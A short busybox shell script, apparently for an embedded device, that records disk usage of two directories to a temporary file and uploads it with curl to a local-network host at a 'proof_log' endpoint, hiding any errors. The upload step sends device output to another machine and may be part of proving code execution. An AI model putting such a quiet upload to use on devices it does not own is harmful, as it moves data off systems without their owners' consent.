#!/bin/sh
BB=/bin/busybox
$BB df -h /var/run/misc/misc_rw /var/tmp > /tmp/df.txt
$BB cat /tmp/df.txt
/usr/sbin/curl -m 10 -T /tmp/df.txt 'http://192.168.0.27:8080/proof_log?tag=df' 2>/dev/null || true
